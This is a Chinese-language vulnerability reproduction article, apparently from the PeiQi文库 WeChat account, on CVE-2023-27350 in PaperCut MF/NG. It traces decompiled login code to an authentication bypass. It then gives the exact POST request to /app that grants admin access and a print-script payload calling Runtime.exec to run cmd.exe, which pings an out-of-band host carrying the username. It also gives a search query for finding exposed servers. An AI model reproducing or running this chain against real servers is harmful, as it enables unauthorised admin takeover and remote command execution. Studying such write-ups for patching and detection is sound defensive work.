#  PaperCut MF SetupCompleted 远程命令执行漏洞 CVE-2023-27350   
原创 PeiQi文库  PeiQi文库   2023-05-02 13:50  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4F46uEyehk0IH7lHFLF4cUdjXwQ2vk0wTGCIb9icVu77fVMtVPreeicnJrIwwfmApVdIID1JrXjeVA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4F46uEyehk0IH7lHFLF4cU28BTMkJPoo8JIicIXC49BCdyApGtNkygZJfZicxapw0X9LySnLXc8SIg/640?wx_fmt=png "")  
## 漏洞描述  
  
PaperCut MF NG 中 SetupCompleted接口中存在未授权访问漏洞，攻击者通过漏洞可以获取后台管理员权限，通过配置脚本JAVA扩展类，可以达到远程命令执行控制服务器  
## 漏洞影响  
  
PaperCut MF
PaperCut NG  
## 网络测绘  
  
"papercut"  
## 漏洞复现  
  
登陆页面  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4F46uEyehk0IH7lHFLF4cUY6QymL6p9G3qggA6icF8ia0voGbdMehZicQLrBJNH3xHOnJ7LLkU8W4vg/640?wx_fmt=png "")  
  
反编译 pcng-server-web-22.0.4.jar，可以看到登陆时验证方法位于  
```
biz/papercut/pcng/web/pages/Home.class

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4F46uEyehk0IH7lHFLF4cUMZ863FOG7y1lH6O1kTKGMn1nPskEOSo6NYOyLXbsZTXEs4BS1Y2VxQ/640?wx_fmt=png "")  
  
其中含有 Google microsoft 等多种方法登陆，统一使用 performLogin 方法进行用户权限验证  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4F46uEyehk0IH7lHFLF4cUYjc4xaQDAmvbk936JLT5Z8mibibl6QdBfN6dEDPcaALF1yZm7dzNn57g/640?wx_fmt=png "")  
```
public Boolean performLogin(String username, @Nullable LoginType preferredLoginType, boolean sso) {
        return (Boolean)this.transactionHelper.runInTransaction(() -> {
            LoginType loginType = this.deriveLoginType(username, preferredLoginType);
            if (loginType != null) {
                AccessRightList accessRights = this.authenticationManager.getUserRights(username);
                accessRights = this.deriveAccessRights(loginType, accessRights);
                return this.loginUser(username, accessRights, loginType, sso);
            } else {
                this.applicationLogManager.logWarn(this.getClass(), "Home.UserLoginFailureUnknownUser", new String[]{username});
                this.setErrorMessage(this.getMessage("LOGIN_DENIED_UNKNOWN_USER"));
                return false;
            }
        });
    }

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4F46uEyehk0IH7lHFLF4cUdZ7IqZ3icRr1XKq2M8LOFWzpcm9PvoXoHAJKVSq7dRElnmEdU9Tp8icg/640?wx_fmt=png "")  
  
最后走到 loginUser方法中，根据用户登陆权限重定向到用户页面  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4F46uEyehk0IH7lHFLF4cUXD8Km8l5bUxwuYyjdibjALhpkUMOKAGODJMiaabPCOPMeyricqGEvdmLg/640?wx_fmt=png "")  
  
漏洞出现在用户设备配置页面处，其中可以看到调用的方法也是 performLogin  
```
public void formSubmit(IRequestCycle cycle) {
        SetupData setupData = this.getSetupData();
        this.getAnalyticsConfigurationService().setEnabled(this.isAnalyticsEnabled());
        this.getAnalyticsConfigurationService().adminNotified();
        this.clearSetupData();
        Home homePage = (Home)cycle.getPage("Home");
        homePage.setJavaScriptEnabled(this.isJavaScriptEnabled());
        homePage.performLogin(setupData.getAdminUserName(), LoginType.Admin, false);
    }

```  
```
biz/papercut/pcng/web/setup/SetupCompleted.class

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4F46uEyehk0IH7lHFLF4cU0ibibMQFQ7BpvSgN4IrPvia6Ylnib3liaCCetK552D4em0VjgIZXoicGpqPA/640?wx_fmt=png "")  
  
主要注意这一部分代码的参数, 代表登陆的权限  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4F46uEyehk0IH7lHFLF4cUQZ60XHrhZd1Nj6QyAJF1ZMTL9pTt7IJic0uFb1sXHVCa2ATI9icrqW8g/640?wx_fmt=png "")  
```
homePage.performLogin(setupData.getAdminUserName(), LoginType.Admin, false);

private String _adminUserName = "admin";

public String getAdminUserName() {
        return this._adminUserName;
    }

```  
  
这里固定的登陆权限为 Admin管理员权限，通过调用这个方法就可以获取管理员的后台权限  
```
/app?service=page/SetupCompleted

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4F46uEyehk0IH7lHFLF4cUIGOUNawZQpv3icRZ6s3CZPwIzefGHMXrB8VWO8iaZib79XO3RzyNHm6Og/640?wx_fmt=png "")  
```
POST /app
Cookie: JSESSIONID=xxx

service=direct/1/SetupCompleted/$Form&sp=S0&Form0=$Hidden,analyticsEnabled,$Submit&$Hidden=true&$Submit=登录

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4F46uEyehk0IH7lHFLF4cUXeu90wqVuR35tlWmhZZpwFt6Ygz32J2iarbyCTshkfkw09e3aXhstDA/640?wx_fmt=png "")  
  
发送请求后就会302跳转到管理员用户页面，对应的请求调用页面也就是第一次配置的请求页面，点击登陆提交请求就可以通过调用方法 performLogin 以管理员权限登陆  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4F46uEyehk0IH7lHFLF4cUiaJ5rDjUJr8r8AF96cR205mKfiaYUKz6nwG45UibQwBQ7JRXIcENtmIHw/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4F46uEyehk0IH7lHFLF4cUDXoff5F5OOXm0Gzmrf2sbWUjTqGibFBekaFkfC8hibWMWficFhuc5J8pw/640?wx_fmt=png "")  
  
在后台中存在脚本调用方法，根据官网配置打开扩展的 Java 类  
```
https://www.papercut.com/kb/Main/EnablingPrintScriptingDeviceScripting#using-extended-java-classes-in-scripts

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4F46uEyehk0IH7lHFLF4cUnyTtl38I5DGImqOnsLNfdxsBzWmfac6xOgDlB1PY5iaR0u28x7cqPtg/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4F46uEyehk0IH7lHFLF4cUPBr7cJ4on495JGmtwFIXmfY9nCwYhZDnsQhsicguEnACMUbSdqAHLfw/640?wx_fmt=png "")  
  
再通过打印机的脚本编写就可以达到组合RCE  
```
function printJobHook(inputs, actions) {}
java.lang.Runtime.getRuntime().exec('cmd.exe /C ping %USERNAME%.cgvpkz72vtc0000ge0eggep5j9oyyyyyb.oast.fun');


```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4F46uEyehk0IH7lHFLF4cUtyaEZaEK4MS0muznfiaps8OBeDWAU7APPEfcZZ0wQYl9evTs2FkVibiaA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4F46uEyehk0IH7lHFLF4cUyYJdHb3SbOb1pz9rLCZp16wNaHEXyZjoiaCVrTE2AKwVRsgI5ZY5TuQ/640?wx_fmt=png "")  
## 关注公众号  
```
下面就是文库的公众号啦，更新的文章都会在第一时间推送在交流群和公众号
想要加入交流群的师傅公众号点击交流群找WgpsecBot机器人拉你啦～

```  
  
  
  
  
  
## 支持作者  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4F46uEyehk0IH7lHFLF4cUHaGcUPiaR17WnC5FicjE6xqDllNmOlOmAKIlLuzMic91KIaCuun9OmyxQ/640?wx_fmt=png "")  
## 关于文库  
```
在线文库: https://wiki.peiqi.tech (暂时关闭个人用户使用)
Github: https://github.com/PeiQi0/PeiQi-WIKI-Book 

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4F46uEyehk0IH7lHFLF4cUVZad6mBl0ice2KWT3SY5x7UTF2uoAdP1cuLibFsZw8a30kRhk0xAzI8Q/640?wx_fmt=png "")  
## 文库动态  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4F46uEyehk0IH7lHFLF4cUQdDUBqqYJEfFqwcJiaVhIRA9VGMMs5wicbOaa0ibQCD2BH9ShmnT1yT3w/640?wx_fmt=png "")  
  
  
  
